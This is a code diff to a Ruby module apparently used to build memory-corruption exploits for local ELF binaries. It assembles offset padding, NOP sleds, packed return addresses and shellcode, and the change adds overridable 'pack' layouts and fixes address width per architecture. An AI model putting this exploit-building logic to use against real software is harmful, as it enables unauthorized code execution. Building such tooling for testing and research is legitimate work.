@@ -20,9 +20,12 @@ module Lictor
 
     # binary: the acquired local ELF copy. facts: text or Facts.
     # technique: the selected technique (drives the layout).
+    # packs: loaded augure packs - a pack build: layout for the
+    # technique WINS over the built-in file (packs teach, the builder
+    # follows).
     # Returns {path:, offset:, offset_source:, sink:, ret:, ret_source:,
     # arch:, size:}.
-    def build(binary:, facts:, technique:, out:, payload_file: nil)
+    def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil)
       facts = Augure::Facts.parse(facts) if facts.is_a?(String)
       # The ELF check FIRST: nothing executes - statically or under the
       # debugger - until the file is a real ELF.
@@ -48,7 +51,7 @@ module Lictor
           "no measured offset - static analysis found no controlled return and the debugger did not either"
       end
 
-      layout = layout_for(technique)
+      layout = layout_for(technique, packs)
       arch = AugureProfiler.arch(binary)
       width = (arch == :x64) ? "Q<" : "L<"
       body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file)
@@ -61,7 +64,7 @@ module Lictor
     # a build: section overrides (packs teach, the builder follows).
     def layout_for(technique, packs = [])
       built_in = YAML.load_file(File.expand_path("../config/build_layouts.yml", __dir__))
-      (packs || []).filter_map(&:build).find { |b| b["technique"] == technique }&.dig("layout") ||
+      Array(packs).filter_map(&:build).find { |b| b["technique"] == technique }&.dig("layout") ||
         built_in.dig(technique, "layout") or
         raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml"
     end
@@ -79,10 +82,13 @@ module Lictor
           filler = (slot[2] == "sled") ? "\x90" : "A"
           body << (filler * offset).b
         when "qword", "dword"
-          value, source = resolve_addr(facts, slot[1], (slot[0] == "dword") ? "L<" : "Q<")
+          # dword is 4 bytes WHATEVER the arch (a partial overwrite);
+          # qword is the arch's pointer width (8 on x64, 4 on x86)
+          slot_width = (slot[0] == "dword") ? "L<" : width
+          value, source = resolve_addr(facts, slot[1], slot_width)
           ret ||= value
           ret_source ||= source
-          body << [value].pack(width)
+          body << [value].pack(slot_width)
         when "shellcode"
           sc = if payload_file
             File.binread(payload_file)
